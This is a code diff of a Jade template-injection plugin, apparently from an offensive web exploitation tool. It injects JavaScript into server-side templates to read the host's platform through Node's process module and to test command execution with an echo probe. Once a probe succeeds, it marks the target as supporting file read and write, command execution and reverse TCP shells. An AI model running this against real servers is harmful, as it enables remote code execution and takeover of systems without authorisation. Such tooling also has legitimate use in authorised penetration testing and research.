@@ -4,11 +4,14 @@ from core import languages
 from core.plugin import Plugin
 from utils import rand
 import base64
+import re
+
 
 class Jade(Plugin):
 
     actions = {
         'render' : {
+            'call': 'inject',
             'render': '\n= %(code)s\n',
             'header': '\n= %(header)s\n',
             'trailer': '\n= %(trailer)s\n'
@@ -31,7 +34,7 @@ class Jade(Plugin):
         },
         'evaluate' : {
             'call': 'render',
-            'evaluate': '- %(code)s'
+            'evaluate': '= %(code)s'
         },
         'blind' : {
             'call': 'execute_blind',
@@ -70,20 +73,33 @@ class Jade(Plugin):
         { 'level': 2, 'prefix' : '%(closure)s\n', 'suffix' : '//', 'closures' : languages.javascript_ctx_closures },
     ]
 
-    def detect_engine(self):
+    language = 'javascript'
 
-        execution_code = """= global.process.mainModule.require('os').platform()"""
-        self.set('os', self.render(execution_code))
-        self.set('language', 'javascript')
-        self.set('evaluate', 'javascript')
-        self.set('engine', 'jade')
+    def rendered_detected(self):
 
-    def detect_blind_engine(self):
+        self.set('engine', self.plugin.lower())
+        self.set('language', self.language)
 
-        if not self.get('blind'):
-            return
+        os = self.evaluate("""global.process.mainModule.require('os').platform()""")
+        if os and re.search('^[\w-]+$', os):
+            self.set('os', os)
+            self.set('evaluate', self.language)
+            self.set('write', True)
+            self.set('read', True)
 
-        self.set('language', 'javascript')
-        self.set('execute', True)
-        self.set('engine', 'jade')
-        self.set('evaluate', 'javascript')
+            expected_rand = str(rand.randint_n(2))
+            if expected_rand == self.execute('echo %s' % expected_rand):
+                self.set('execute', True)
+                self.set('tcp_shell', True)
+                self.set('reverse_tcp_shell', True)
+
+
+    def blind_detected(self):
+
+        self.set('engine', self.plugin.lower())
+        self.set('language', self.language)
+
+        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
+            self.set('execute_blind', True)
+            self.set('tcp_shell', True)
+            self.set('reverse_tcp_shell', True)
